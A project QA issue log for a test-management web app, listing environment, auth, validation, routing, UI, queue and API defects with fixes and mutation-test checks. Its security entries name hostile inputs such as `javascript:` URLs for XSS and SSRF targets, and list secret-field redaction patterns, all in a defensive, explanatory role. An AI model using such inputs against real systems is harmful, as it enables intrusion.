# PROOFLOOP QA – Issue Log

Record of defects, risks and environment problems found while building Phases 1–5
(2026-11-05 → 2026-11-06), with root cause, fix and how the fix was verified.
Use it to understand *why* code looks the way it does and to avoid re-introducing
known problems.

**Status:** ✅ fixed · ⚠️ open / accepted risk
**Source:** *Spec* = came from a pasted implementation step · *Env* = tooling/environment ·
*Impl* = found in our own code or tests

Regression suite: `npm run test:e2e -w @proofloop/web` (Playwright, 289 tests as of 2026-11-11; starts API,
web and worker), plus 2 opt-in outage tests: `$env:E2E_DB_OUTAGE='1'; npm run test:e2e -w @proofloop/web -- db-outage`
and `$env:E2E_REDIS_OUTAGE='1'; npm run test:e2e -w @proofloop/web -- automation-worker` (stops/starts `proofloop-redis`).

**In the app:** all sections (1–12) are also stored as `Defect` rows (defId = the IDs below, status
`CLOSED` = ✅, `OPEN` = ⚠️) in organization *ProofLoop Inc*, project *ProofLoop QA Platform*.
After editing this log, update `packages/prisma/scripts/seed-issue-log.cjs` and re-run it
(idempotent upsert): `node packages/prisma/scripts/seed-issue-log.cjs`.

**Completeness:** ENV-15+, AUTH-17+, DATA-14+, ROUTE-05+, UI-10+, TEST-08+ and PROC-01 were added on
2026-11-06 after a full review of the build conversation transcript (each backed by a quote from it).

---

## 1. Recurring patterns (check these first in every new step)

| # | Pattern | Seen | Rule |
|---|---|---|---|
| P1 | `router.use(authenticate)` on a router mounted at `/api` | Risks, Test Cases, Traceability, Automation | Attach `authenticate` **per route**. A router-level guard on an `/api` mount intercepts every unmatched `/api` request: `/api/health` returned **401**, unknown paths 401 instead of 404. Verified by mutation test. |
| P2 | `z.string().min(1).trim()` | Projects, Modules, Project modal | Use `.trim().min(1)`. Checks run in order, so `"   "` passed and was stored as `""`. Verified by mutation test. |
| P3 | `getApiErrorMessage(err)` without fallback | 5+ pastes | Signature is `(error, fallback)`; missing arg = compile error. |
| P4 | `import { api } from './api-client'` inside `lib/api/*` | risks, test-cases, traceability, automation | Correct path is `'../api-client'`. |
| P5 | `hover:bg-sidebar-active` / `bg-sidebar-active` | Multiple UI pastes | Token was renamed to `sidebar-accent` in the shadcn token merge; old class generates no CSS. |
| P6 | `catch (error: any)` + manual `ZodError`/`P2002` branches | Most controllers | Use `handleError()` + `isUniqueViolation()` from `apps/api/src/utils/http-error.ts`. **Still open in `environment.controller.ts`.** |
| P7 | Non-axios errors leave `error` unset | Several pages | Page then renders the *empty state* instead of an error. Always set an error in `catch`. |
| P8 | Role checks like `role !== 'VIEWER'` | Several pages | Use `apps/web/src/lib/permissions.ts` (mirrors backend `requireRole` lists). |
| P9 | Modal without Escape/reset/`aria-labelledby`, field errors with `role="alert"` | Every modal paste | Follow `CreateProjectModal.tsx`: single `close()` that resets form + server error, Escape handler, labelled dialog, only the server error is an alert. |

---

## 2. Environment & tooling

| ID | Status | Source | Issue | Fix |
|---|---|---|---|---|
| ENV-01 | ✅ | Env | Prisma 7 rejects `url = env(...)` in `datasource`. | Pinned Prisma **6.19.x**. |
| ENV-02 | ✅ | Env | Tailwind v4 removed `npx tailwindcss init -p`. | `@tailwindcss/vite` plugin + `@import "tailwindcss"`. |
| ENV-03 | ✅ | Env | Host ports busy: native Postgres on 5432, another project's `berd-redis` on 6379. | Compose maps **5433→5432** and **6380→6379**; `.env` updated. |
| ENV-04 | ✅ | Env | `docker-compose.yml` `version:` key obsolete. | Removed; added healthchecks. |
| ENV-05 | ✅ | Env | Root ESLint 8 vs Vite template ESLint 9. | Root bumped to 9. |
| ENV-06 | ✅ | Env | User reported an issue with `moduleResolution: "node"` in the API tsconfig. Exact error text was never captured or reproduced; assumed to be the newer-TypeScript deprecation warning. | API tsconfig → `NodeNext`. `baseUrl` also avoided (deprecated). |
| ENV-07 | ✅ | Env | Vite reads `.env` from `apps/web`, so root `VITE_API_URL` was ignored. | `envDir` → repo root (verified with a probe build). |
| ENV-08 | ✅ | Env | `shadcn add` silently installed npm package **`cn`** and rewrote UI imports to it. | Package removed by the user (missed in the first review, confirmed in the next); components import `cn` from `@/lib/utils`. |
| ENV-09 | ✅ | Spec | `create-playwright --yes --output` – flags do not exist. | Used `--quiet --lang=TypeScript --browser=chromium --no-examples`. |
| ENV-10 | ✅ | Env | `apps/web` is `"type": "module"` → `__dirname` undefined in `playwright.config.ts`. | `fileURLToPath(import.meta.url)`. |
| ENV-11 | ✅ | Env | `Start-Process npx` fails on Windows (`.cmd`). | Start Vite via `node node_modules/vite/bin/vite.js`. |
| ENV-12 | ✅ | Env | `tsc` does not delete stale output; renamed `requirement.routes.ts` left `dist/routes/requirement.routes.js`. | Deleted manually. Clean `dist/` after renames. |
| ENV-13 | ✅ | Impl | Vite bundle > 500 kB warning. | Route-level `React.lazy` + `Suspense` (shell keeps its own Suspense). |
| ENV-14 | ⚠️ | Env | `npm audit` reports vulnerabilities. | Reviewed 2026-11-12: 4 high. `zod` <4.6.6 (memory exhaustion on oversized constrained collections; fix = zod 4, breaking; exposure limited by the 1 MB body limit) and `prisma` CLI via `@prisma/config` → `deepmerge-ts` (dev tooling only; fix = Prisma 7, which ENV-01 rejected). Accepted until a planned zod 4 / Prisma 7 migration. |
| ENV-15 | ✅ | Env | Playwright 1.64.1 expected Chromium build 1248; machine had 1243 (`Executable doesn't exist`). | Temporarily pointed at installed Chromium; `create-playwright` later installed build 1248. |
| ENV-16 | ⚠️ | Env | Early browser check of the Vite dev server timed out (`The operation has timed out.`); routing/themes untested in a browser at that point. | Never diagnosed (assumed first-run dependency optimisation). Later e2e suite runs the dev server fine. |
| ENV-17 | ✅ | Spec | Paste's `npm install zod` would install zod v4; API uses 3.25.76. | Pinned `zod@^3` (compatible with `@hookform/resolvers` 7). |
| ENV-18 | ✅ | Spec | Paste installed `react-router-dom`, redundant in v7 (re-exports `react-router`). | Not installed; imports from `react-router`. |
| ENV-19 | ✅ | Spec | `react-refresh/only-export-components` lint warnings (`ThemeContext.tsx` exported component + hook; shadcn UI files). | Hook moved to `theme-context.ts`; ESLint override for `src/components/ui/**`. |
| ENV-20 | ⚠️ | Spec | `.env` still has the sample database password (AUTH-02 covers only `JWT_SECRET`). | Change before deploying anywhere. |

---

## 3. Authentication & authorization

| ID | Status | Source | Issue | Root cause | Fix / verification |
|---|---|---|---|---|---|
| AUTH-01 | ✅ | Impl | API **crashed** on duplicate registration. | `@proofloop/prisma` runtime did not export `Prisma`; `instanceof Prisma.…` threw inside `catch`; Express 4 does not catch async rejections → process died. | Package re-exports all of `@prisma/client`. Smoke test: duplicate → 409, server alive. |
| AUTH-02 | ✅ | Spec | Placeholder `JWT_SECRET` accepted. | No startup validation. | `config.ts` refuses missing/placeholder/<32 chars; random secret generated in `.env`. |
| AUTH-03 | ✅ | Spec | Login timing revealed which emails exist. | bcrypt only ran for known users. | Compare against a dummy hash for unknown users. |
| AUTH-04 | ✅ | Spec | Emails case/space sensitive; passwords > 72 chars silently truncated by bcrypt. | — | Trim + lowercase emails; `max(72)`. |
| AUTH-05 | ✅ | Spec | Axios 401 interceptor fired on **wrong-password** login → treated as "session expired". | Interceptor did not distinguish auth entry endpoints. | `/auth/login` and `/auth/register` excluded. |
| AUTH-06 | ✅ | Spec | API down → app shell rendered with `user === null`. | `ProtectedRoute` checked token only. | Requires `token && user`. E2E: API-down test. |
| AUTH-07 | ✅ | Spec | **Infinite redirect loop** when API down. | `GuestRoute` checked token only while `ProtectedRoute` required user. | Both use `token && user`. E2E counts navigations. |
| AUTH-08 | ✅ | Impl | After login from `/defects`, user landed on `/`. | React Router v7 applies `navigate()` in a transition; `GuestRoute` rendered first and redirected to `/`. | `GuestRoute` redirects to the same `from` location. Caught by E2E. |
| AUTH-09 | ✅ | Impl | **Stale JWT role**: demoted user kept permissions up to 7 days. | Role read from token. | `authenticate` loads role + org from DB each request. Verified: old ADMIN token → 403 after demotion. |
| AUTH-10 | ✅ | Impl | Deleted user / user moved to another org kept access on read routes. | Same as AUTH-09. | Same fix; deleted user → 401 (401 came from the user's later middleware change; the first fix returned 403 — see AUTH-23). E2E covers both. |
| AUTH-11 | ✅ | Spec | **DB outage logged every user out.** | DB lookup inside the same `try` as `jwt.verify` → DB error returned 401 → client interceptor deleted token. | Separate `try`; DB failure → **503**. Verified by stopping Postgres (opt-in `db-outage.spec.ts`). |
| AUTH-12 | ✅ | Spec | HS256 pin dropped; `Role \| string` widened types (typo `'ADMN'` compiled). | Paste rewrote middleware. | `algorithms: ['HS256']` restored (mutation: HS512 token got 200 without pin); `Role` type restored (`TS2820` on typo). |
| AUTH-13 | ⚠️ | Spec | JWT stored in `localStorage` (XSS-readable). | Design decision. | Accepted for Phase 1; migrate to httpOnly cookies + CSRF in hardening phase. |
| AUTH-14 | ✅ | Impl | No rate limiting on `/auth/login`, `/auth/register`. | — | Fixed 2026-11-12 (SEC-08): failed logins 10/15 min per IP+email, forgot-password 5/15 min per IP+email, reset 20/15 min per IP, register 20/h per IP (loopback exempt outside production). |
| AUTH-15 | ⚠️ | Impl | Express 4 does not catch rejected async handlers. | All current controllers use try/catch. | Add a wrapper or move to Express 5 before handlers without try/catch appear. |
| AUTH-16 | ✅ | Impl | Requests under `/api/projects/*` run `authenticate` twice (2 user lookups). | `project.routes.ts` uses `router.use(authenticate)` and is mounted before the per-route-auth routers that share the `/api/projects` prefix. (Code observation, not measured.) | Open – make `project.routes.ts` per-route too. **Fixed 2026-11-12:** `authenticate` returns early when `req.user` is already set (one user lookup per request). |
| AUTH-17 | ✅ | Spec | **No RBAC on create routes:** `VIEWER` could create projects and modules. | Routes did not call `requireRole` (UI-06 covers only buttons). | `requireRole`: ADMIN/QA_LEAD for projects, QA_ENGINEER+ for modules. E2E RBAC tests. |
| AUTH-18 | ✅ | Spec | No logout in the UI. | `logout()` only ran on a 401. | Logout button added. |
| AUTH-19 | ✅ | Spec | Signed-in users could still open `/login` and `/register`. | No guard on guest pages. | `GuestRoute` added (its later bugs: AUTH-07/08). |
| AUTH-20 | ✅ | Spec | Token stayed in `localStorage` when the API was unreachable. | Only a 401 cleared it. | Superseded: AUTH-11 deliberately keeps the token on 503. |
| AUTH-21 | ✅ | Spec | User's middleware edit used `split(' ')[1]`; extra spaces in `Authorization` no longer tolerated. | Regression in edit. | `slice` + `trim` restored. |
| AUTH-22 | ✅ | Impl | Correctly signed token without an `id` claim not explicitly rejected. | Missing claim check. | Rejected with 401. |
| AUTH-23 | ✅ | Spec | Deleted user got 403 instead of 401 on create routes. | Paste behaviour kept in first fix. | User's middleware change → 401; test updated. |
| AUTH-24 | ⚠️ | Impl | No API to create non-ADMIN users or change roles. | Not built yet. | Tests set roles directly in the DB. Open. **Update 2026-11-11:** roles can now be changed by admins (``PATCH /api/organization/users/:id/role``); creating/inviting users is still missing. |

---

## 4. Data integrity & validation

| ID | Status | Source | Issue | Fix / verification |
|---|---|---|---|---|
| DATA-01 | ✅ | Spec | Whitespace-only names stored as `""` (see P2). | `.trim().min(1)`; mutation test confirmed. |
| DATA-02 | ✅ | Spec | Duplicate module name → **500**. | `P2002` → 409. |
| DATA-03 | ✅ | Spec | 400 `details` returned as an array of issue objects → UI would render `[object Object]`. | `error.flatten().fieldErrors` everywhere (`{ field: string[] }`). |
| DATA-04 | ✅ | Spec | `reqId` / `tcId` case-sensitive (`req-001` ≠ `REQ-001`). | `.toUpperCase()` in API + forms. |
| DATA-05 | ✅ | Spec | **12 orphaned risks** in DB. | `Risk.requirement` was `onDelete: SetNull`; test teardown deleted orgs → requirements → risks kept with `NULL`. Our teardown check only counted orgs, so it missed them. Fixed: `requirementId` required + `onDelete: Cascade`; orphans (all test data, verified by title) deleted; post-run checks now also count child tables. |
| DATA-06 | ✅ | Spec | Duplicate `stepNumber` returned misleading **409 "Test Case ID exists"**. | `TestStep @@unique([testCaseId, stepNumber])` raised P2002. First fix: validation → 400 for duplicate step numbers (mutation-verified: without it, `Expected: 400, Received: 409`). Final fix: server assigns `stepNumber = index + 1`; client value ignored. |
| DATA-07 | ✅ | Spec | `requirementId` on a test case not scoped to project. | Must belong to the same project (400 otherwise). |
| DATA-08 | ✅ | Spec | **Security:** execution `environmentId` not scoped → could link another org's environment; unknown id → 500 (FK). | Must belong to the automation project's project (400). Mutation: removing the check → 201 for another project's env. |
| DATA-09 | ✅ | Spec | `runId` = count+1 races → concurrent triggers hit unique index → 500. | Retry on P2002 (5 attempts, re-count each time, no gaps). Mutation: 1 attempt → 2 of 5 concurrent requests failed. |
| DATA-10 | ✅ | Spec | **Security (XSS):** `z.string().url()` accepts `javascript:` / `file:` URLs. | `safeUrlSchema` (http/https only) used for repository and environment `baseUrl`. |
| DATA-11 | ✅ | Spec | Risk score/level could be sent by client. | Computed server-side; client values ignored (tested). |
| DATA-12 | ⚠️ | Spec | IDs sort lexically (`REQ-10` before `REQ-2`). | By design; use zero-padded IDs (`REQ-010`). |
| DATA-13 | ⚠️ | Spec | Standalone test cases are not in the Traceability Matrix. | By design (RTM measures requirement coverage); planned for Reports (Module 13). |
| DATA-14 | ✅ | Spec | Paste's `Risk` model dropped `@@index([requirementId])`. | Index kept. |
| DATA-15 | ✅ | Spec | Paste's `getRequirements` 500 handler did not log the error (errors would vanish). | `handleError()` logs and returns 500. |

---

## 5. Routing & API wiring

| ID | Status | Source | Issue | Fix |
|---|---|---|---|---|
| ROUTE-01 | ✅ | Spec | `/api` mounts with router-level auth (P1). | Per-route `authenticate`. |
| ROUTE-02 | ✅ | Spec | `GET /projects/:id/requirements` added to `module.routes.ts` → real URL `/api/modules/projects/...` → **404**. | Moved to `project.routes.ts`. Mutation confirmed 404. |
| ROUTE-03 | ✅ | Spec | `include: { project: true }` exposed full project (incl. `organizationId`) where only name needed. | `select: { id, name }`. |
| ROUTE-04 | ✅ | Spec | Pages added without routes or links (Risks, Test Cases, Requirements). | Routes + project-page links; `IMPLEMENTED_NAV_PATHS` prevents placeholder/real route collisions. |
| ROUTE-05 | ✅ | Spec | No `GET /projects/:id`; project page could not show the project name. | Added by the user. |
| ROUTE-06 | ✅ | Impl | `lib/api.ts` and `lib/api/index.ts` both existed; `@/lib/api` resolved only because files win over folders. | Renamed to `lib/api-client.ts`. |
| ROUTE-07 | ✅ | Spec | Automation backend had no environment management and no run-list endpoint. | User added environments API and `GET /automation/:id/executions`; verified with 11 new tests. |
| ROUTE-08 | ✅ | Spec | Risks could not be created from the UI; sidebar "Risk Analysis" pointed to a placeholder. | Flat requirements endpoint, `CreateRiskModal` wired, `GlobalRisksPage`. |
| ROUTE-09 | ✅ | Spec | Paste's `App.tsx` would delete the 16 module routes and the 404 page (twice). | Kept, now lazy-loaded. |
| ROUTE-10 | ✅ | Spec | Automation Lab page had no route, no link from the project page, and the sidebar entry stayed a placeholder. | `projects/:projectId/automation` + `automation` (project picker) routes; `/automation` in `IMPLEMENTED_NAV_PATHS`; project page link. |

---

## 6. Frontend

| ID | Status | Source | Issue | Fix |
|---|---|---|---|---|
| UI-01 | ✅ | Spec | Mobile sidebar toggled state but never rendered. | Drawer with overlay/Escape/close-on-navigate. |
| UI-02 | ✅ | Spec | Theme flash on load; `system` theme not live; `dark:` variant tied to OS. | Inline pre-paint script; `matchMedia` listener; `@custom-variant dark`; `@theme inline`. |
| UI-03 | ✅ | Spec | Hardcoded `#334155` borders broke light mode. | `--border` token per theme. |
| UI-04 | ✅ | Spec | Several paste files did not compile: missing `Outlet`/`React` imports, `verbatimModuleSyntax` type imports, `Promise<null>` typing, 7 unused locals (`noUnusedLocals`). | Fixed per file. |
| UI-05 | ✅ | Spec | New test case showed **0 steps** until reload. | POST returns `steps[]`, list returns `_count`; `stepCount()` handles both. Mutation confirmed `0`. |
| UI-06 | ✅ | Spec | Create buttons shown to roles that get 403. | `lib/permissions.ts`. |
| UI-07 | ✅ | Spec | Requirements page lost module/project context on fresh tab. | Router state first, fallback to `GET /modules/:id`; failure still shows requirements. |
| UI-08 | ✅ | Spec | Inputs without `htmlFor`/`id`; hover-only delete buttons; duplicate generic IDs. | Labelled inputs, visible labelled buttons, prefixed IDs. |
| UI-09 | ✅ | Spec | No Automation Lab UI; executions stayed `PENDING` (no worker). | UI built 2026-11-10; BullMQ queue + `apps/worker` move runs to RUNNING → PASSED/FAILED (results still simulated: WORK-09). |
| UI-10 | ✅ | Spec | Pages showed `data.error`, so every 400 said only "Validation failed" (login, project modal, requirements). | `getApiErrorMessage` shows field details. |
| UI-11 | ✅ | Spec | Test Case Studio had no `description`/`testData` fields and no detail page. | Added by the user; verified. |
| UI-12 | ✅ | Spec | No Defects page or API; no Task model. Defects from this log are visible only via Prisma Studio. | Built 2026-11-11 (DEF-07). |
| UI-13 | ✅ | Spec | Paste dropped `encodeURIComponent` and left untyped `api.get` (`getTestCase`, `getTraceabilityMatrix`). | Typed calls; encoding kept. |
| UI-14 | ✅ | Spec | Blocked `localStorage` (private mode) threw and blanked the app. | try/catch in theme and auth storage. |
| UI-15 | ✅ | Spec | Inter font never loaded (silent fallback to `system-ui`). | Loaded from Google Fonts. |
| UI-16 | ✅ | Spec | Theme toggle/nav a11y: emoji button, no `aria-label`, no current-page highlight, toggle showed "Dark" on `system`. | Labelled icon buttons, active state, correct label. |
| UI-17 | ✅ | Spec | Nav used plain `<a>`; every click reloaded the page. | `NavLink`. |
| UI-18 | ✅ | Spec | Requirements table `overflow-hidden` cut columns on narrow screens. | `overflow-x-auto`. |
| UI-19 | ✅ | Spec | Risk modal `z.coerce.number()` conflicted with `useForm` typing. | `valueAsNumber` + `z.number()`. |
| UI-20 | ✅ | Spec | Modals mutated the created object (`newRisk.requirement`, new test case). | Copy instead of mutate. |
| UI-21 | ✅ | Spec | Risk modal unusable on a project with no requirements (empty dropdown, can't submit). | Hint shown, submit disabled. |
| UI-22 | ✅ | Spec | Typing/quality drift: optional fields where API returns `null`; duplicated project picker; plain strings instead of `RiskLevel`/`TestType`/`AutomationStatus`; missing `useEffect` dep; dead `'Loading...'` fallback; spinner without `role="status"`; relative imports instead of `@/`. | Fixed; shared `ProjectPicker`. |
| UI-23 | ✅ | Spec | Traceability error state back link said "Back to Project" (name not loaded). | "Back to Project Dashboard". |
| UI-24 | ✅ | Spec | Automation Lab: environments were loaded only when the Environments modal opened → Run dialog had no environments until then, and a `VIEWER` (no modal) never had any. | Page loads environments with the other data and passes them to both modals. Mutation: empty list → Run dialog showed only "-- No Environment --". |
| UI-25 | ✅ | Spec | Automation Lab client forms used `z.string().url()` (accepts `javascript:`), repeating DATA-10 on the client. | `apps/web/src/lib/safe-url.ts` mirrors the API `safeUrlSchema`. Mutation: `.url()` → `javascript:` repository accepted. |
| UI-26 | ✅ | Spec | Automation Lab used `canCreateRequirement` for its buttons. | `canManageAutomation` / `canCreateEnvironment` in `lib/permissions.ts`, mirroring `automation.routes.ts` / `environment.routes.ts`. |
| UI-27 | ✅ | Spec | "View History" was a styled `<span>` that did nothing. | Toggle button loading `GET /automation/:id/executions`; new runs prepended while open. |
| UI-28 | ✅ | Spec | Paste omitted `CreateAutomationProjectModal` and its button (no way to create a suite in the UI); also unused `Trash2` import (build fails under `noUnusedLocals`), returned execution object mutated (see UI-20), modals without Escape/reset (P9), `getApiErrorMessage` without fallback (P3). | Modal + button built; others fixed per existing rules. |

---

## 7. Test-suite lessons (our own mistakes – keep in mind when writing tests)

| ID | Lesson |
|---|---|
| TEST-01 | Teardown checks must cover **child tables**, not only organizations (missed DATA-05). |
| TEST-02 | `page.goto()` to the *current* URL behaves like reload in Chromium – `history.state` survives. Use a new tab for "fresh visit". |
| TEST-03 | `browser.newPage()` cannot open extra tabs ("Please use browser.newContext()"). Create a context first. |
| TEST-04 | Sidebar and page share link names ("Test Case Studio"). Scope locators to `getByRole('main')`, otherwise the sidebar link may be the only match while the page loads. |
| TEST-05 | `npx playwright test -g` skips serial setup tests → shared IDs are `undefined` → misleading 404s. Include the setup test in the grep for mutation checks. |
| TEST-06 | A test passing after a fix does not prove it guards the bug. Re-introduce the bug (mutation check), confirm failure, restore. Done for P1, P2, AUTH-12, DATA-06 (first fix), DATA-08/09, ROUTE-02, UI-05. |
| TEST-07 | First retry implementation for DATA-09 used `count + 1 + attempt` → would skip run IDs. Caught in review before testing. |
| TEST-08 | `toHaveURL` passed during a transient URL (`/defects` before redirect). Re-check the URL after the page renders. |
| TEST-09 | First browser regression test lived only in the session scratchpad, not the repo. Fixed by adding Playwright to `apps/web`. |
| TEST-10 | TEST-05 repeated: a `-g` mutation run of the Redis-outage test skipped the earlier tests, so run numbers differed and the result was invalid. Re-ran the whole file. |
| TEST-11 | A code comment claimed the API "would crash" without a queue `error` listener. The mutation check showed no crash, so the claim was removed. Don't write a failure mode into a comment before observing it. |
| TEST-12 | "Poll POST until 201" creates a CANCELLED run for every failed attempt, so the exact run number is not fixed. Assert gap-free numbering and statuses instead. |
| TEST-14 | react-hook-form submits a `disabled` input as `undefined`; using `disabled` for the `exists` value field would have failed its own `z.string()` rule. Caught in review; `readOnly` used. When a failing UI test shows no page snapshot, print the page text – that is how API-13 was found. **Correction 2026-11-11:** the claim was never tested and is false for the native ``disabled`` attribute in react-hook-form 7.91 (only ``register(name, { disabled: true })`` drops the value) – see TEST-20. |
| TEST-15 | A mutation that inserted `// MUTATION` mid-line commented out the rest of the route line, so the API did not compile and the run printed no results. Put mutation markers at the end of the line, and check for "Compilation error" before reading a mutation result. All 12 execution tests passing on the first run was not trusted until each SSRF layer had been switched off once. |
| TEST-16 | A test assumed the local target server sends `content-length`; a probe showed Node sends that response chunked, so the engine was right to fail the check. Probe the environment before asserting on it. Also: a PowerShell mutation script with nested arrays silently applied nothing – the "REPLACE FAILED" guard caught it; keep that guard. |
| TEST-17 | PowerShell 5.1 `Set-Content -Encoding utf8` added a **BOM** to the user's `environment.controller.ts` and `Add-Content` wrote CRLF into an LF file; both were detected and reverted. Write files with `[IO.File]::WriteAllText(..., UTF8Encoding($false))` and check BOM/line endings after scripted edits. A test case without the secret it meant to test (`{{baseUrl}}.example.com/x`) also passed for the wrong reason until the message was read. |
| TEST-18 | A supplied security spec (2026-11-11) was run verbatim before adapting it: 4/4 failed – variables at `/api/projects/:id/variables` (404; real path `/api/environments/:id/variables`), undefined `{{TEST_VAR}}` (400 before the SSRF check), VIEWER in a different organization (404), fixed limit 30 vs. configured 200. Non-serial mode re-ran `beforeAll` after every failure and left 8 non-`E2E` organizations (deleted). Corrected as `api-intelligence-security.spec.ts`. Run supplied tests as-is first; use serial mode, `E2E ` org names and cleanup. |
| TEST-19 | I wrote a schema comment claiming `NoAction` (end-of-statement check) would allow org deletion, before testing it; it did not (TEST-11 again). A failing `afterAll` also left 12 organizations because cleanup assumed cascades always work. Verify constraint behaviour on the real database first; clean up children explicitly when a Restrict FK is involved. |
| TEST-20 | A mutation meant to prove 'disabled Bug ID breaks edit' failed for the wrong reason (my own `readonly` assertion fired first). Re-run without that assertion: edit still saved – react-hook-form 7.91 keeps values of natively `disabled` inputs. TEST-14's claim (repeated in 4 code comments) was false; comments corrected. A mutation must fail on the behaviour under test, not on an assertion about the implementation. |
| TEST-21 | Second supplied spec (defects + traceability, 2026-11-11) run verbatim: setup failed (requirement without `priority`/`businessCriticality` → 400; `/requirements/:id/test-cases` → 404). With only setup fixed: browser token key `proofloop_token` (real: `proofloop-auth-token`) → not logged in; non-serial mode re-ran `beforeAll` (2 orgs per run). With the key fixed: `getByRole('cell', { name: 'BUG-001' })` ambiguous (the 'Edit BUG-001' button). Expected labels 'Active Bugs' / '2 Active Bug(s)' differ from the implemented 'Active Bugs (linked)' / '2 Active Bugs' (DEF-13/15). 4 'Defect Org' organizations + 6 defects deleted. Corrected as `defects-traceability-ui.spec.ts` (2/2 pass). My own slip while correcting: `has: main.getByText(...)` inside a row filter never matches (the inner locator is evaluated relative to each row). |
| TEST-13 | TEST-11 again: a controller comment said "Prisma rejects a plain null for Json columns". A probe showed Prisma 6 accepted it (the insert only failed on the probe's fake foreign key). Comment corrected. Probe library behaviour before writing it down. |

---

## 9. Queue & worker (BullMQ, `apps/worker`)

| ID | Status | Source | Issue | Fix / verification |
|---|---|---|---|---|
| WORK-01 | ✅ | Spec | With the spec's producer connection (offline queue on), a trigger while Redis was down **hung the HTTP request** (until the 2-min test timeout). | `enableOfflineQueue: false` in `apps/api/src/lib/queue.ts` → `add()` fails fast. Mutation-verified with the opt-in Redis-outage test. |
| WORK-02 | ✅ | Spec | No handling for an enqueue failure: the run would stay `PENDING` forever. | Run marked `CANCELLED` (row kept: deleting it would break count-based RUN-NNN numbering), API returns **503** "Execution queue is unavailable, please retry". |
| WORK-03 | ✅ | Spec | Worker updated runs unconditionally: a deleted run (org removed) would throw, and a CANCELLED/finished run could be restarted. | Guarded `updateMany` (PENDING/RUNNING → RUNNING, RUNNING → result); deleted runs logged and skipped (seen in test logs). |
| WORK-04 | ✅ | Spec | Worker wrote made-up `logUrl`s (`https://storage.proofloop.qa/logs/...`): dead or third-party links once rendered. | `logUrl` stays `null` until log storage exists (tested). |
| WORK-05 | ✅ | Spec | Worker installed its own `@prisma/client` instead of the shared client. | Uses `@proofloop/prisma` (same generated client and singleton as the API). |
| WORK-06 | ✅ | Env | `npm install bullmq ioredis` installed **bullmq 6 / ioredis 6**; the spec specifies `^5`. | Pinned bullmq 5.81.5 / ioredis 5.11.1 (v6 changes not reviewed). |
| WORK-07 | ✅ | Spec | Finished jobs kept in Redis forever; a run could be enqueued twice. | `removeOnComplete: 1000`, `removeOnFail: 5000`; `jobId` = execution id. |
| WORK-08 | ✅ | Spec | UI never showed the worker's result: run history was cached, with no refresh and no counts. | History refetched on open + Refresh button; passed/failed/skipped and duration for finished runs (tested). |
| WORK-09 | ⚠️ | Spec | Worker results are **simulated** (random 5–15 s, ~85 % pass, random counts) but look like real results in the UI. | By design for Phases 1–5; replace with a real Playwright run against the cloned repository. |
| WORK-10 | ⚠️ | Impl | Runs created before the queue existed (e.g. "Berd" RUN-001) are never queued and stay `PENDING`. No re-queue for PENDING runs if Redis loses jobs. | Open: decide on a re-queue / cancel policy. |
| WORK-11 | ✅ | Spec | Worker had no graceful shutdown. | SIGINT/SIGTERM: `worker.close()` (finishes the in-flight job), Prisma disconnect. |

---

## 10. API Intelligence (Module 6 backend)

| ID | Status | Source | Issue | Fix / verification |
|---|---|---|---|---|
| API-01 | ✅ | Spec | P1 again: `router.use(authenticate)` on the `/api` mount. | Per-route `authenticate`. Mutation: `/api/health` → 401. |
| API-02 | ✅ | Spec | P6 again: `catch (error: any)` + manual `ZodError` branches. | `handleError()` + `isUniqueViolation()`. |
| API-03 | ✅ | Spec | `body: data.body \|\| {}` stored "no body" as `{}` and turned valid bodies `0`, `false`, `""` into `{}`. | Body kept as sent; omitted/`null` → SQL `NULL`. Tested for 0, false, "", [], null. Mutation: omitted body became `{}`. |
| API-04 | ✅ | Spec | `sequenceNumber = count + 1` without a unique index: concurrent creates can get the same position (same race as DATA-09; reasoning, not observed without the index). | `@@unique([collectionId, sequenceNumber])`, `max + 1` (survives future deletes), retry on P2002. Mutation: 1 attempt → concurrent creates failed. |
| API-05 | ⚠️ | Spec | **Security:** `auth` and `headers` (tokens, passwords, API keys) are stored as plain JSON and were returned by `GET .../requests` to every role, including `VIEWER`. | Decision (2026-11-10): Reference Pattern (`{{API_TOKEN}}`) + redaction for VIEWERs. **Redaction done** (see API-09). **Still open:** the Reference Pattern is not enforced – raw secrets in request fields are still accepted and stored in plain text; the enforcement rule (which fields, reject or warn) is not specified yet. Since 2026-11-10 a secret vault exists to reference instead (API-23). |
| API-06 | ✅ | Spec | **Security:** `endpoint` accepts any string; executing it server-side allows SSRF. | Execution engine (2026-11-10) blocks it in 3 layers – see API-25/26. 15 blocked targets + 3 redirect cases tested. |
| API-07 | ✅ | Spec | `body`, `auth`, `assertions` were schema-less (`z.any()`). The spec's replacement still accepted `{type:'bearer'}` without a token and assertions like `{type:'body', operator:'greater_than'}` without path or value. | `auth` = discriminated union (each type requires its fields; unknown keys stripped; apiKey `in` defaults to header). Assertions require `path` for header/body, a `value` unless `exists`, a number for `greater_than`/`less_than`; value is a JSON scalar. Mutation-verified for both. `body` stays free JSON by design. |
| API-09 | ✅ | Spec | Spec's VIEWER redaction masked only the `Authorization` header. | Name-pattern redaction for headers **and** query params (`authorization`, `cookie`, `token`, `secret`, `password`, `api-key`, `session`) plus auth `token`/`password`/`value`. Mutation with the spec's version: VIEWER received `X-API-Key`, `Cookie`, `X-Auth-Token`, `api_key`, `access_token` in plain text. |
| API-10 | ✅ | Spec | Spec's redaction mutated the fetched objects in place (`auth.token = '********'`). | `utils/redact.ts` returns copies; test checks stored data still holds the raw values. |
| API-11 | ✅ | Impl | Omitted `auth` was stored as `{}`, which is not a valid config under the new auth schema. | Default `{ type: 'none' }` (tested). |
| API-13 | ✅ | Spec | **Dev proxy captured client routes:** Vite proxy key `'/api'` is a prefix, so `/api-collections/...` went to Express → direct visit / refresh showed "Cannot GET". Found by the UI tests. | Proxy key `'^/api(/\|$)'`. Mutation: old key → test fails. Production hosting must route the same way (only `/api` and `/api/*` to the API). |
| API-14 | ✅ | Spec | Builder dropped every assertion without a value (`filter(a => a.value !== '')`), so `exists` assertions were silently lost. | All rows kept; `exists` sends no value. Mutation-verified. |
| API-15 | ✅ | Spec | Save errors used `err instanceof Error ? err.message : ...`; Axios errors are `Error`s, so every API 400 showed "Request failed with status code 400". | JSON body validated in the form schema; API errors via `getApiErrorMessage`. Mutation-verified (exact symptom reproduced). |
| API-16 | ✅ | Spec | Paste did not compile: `PlayCircle` not imported; `'./api-client'` (P4); assertion type both `register`ed and wrapped in a `Controller`. | Fixed; `watch` for conditional fields. |
| API-17 | ✅ | Spec | Assertion values sent as strings (status `"200"`), no `greater_than` option, stale `path` sent after switching type. | Numbers for status/responseTime/comparisons, all 6 operators, `path` only for header/body (tested against stored JSON). |
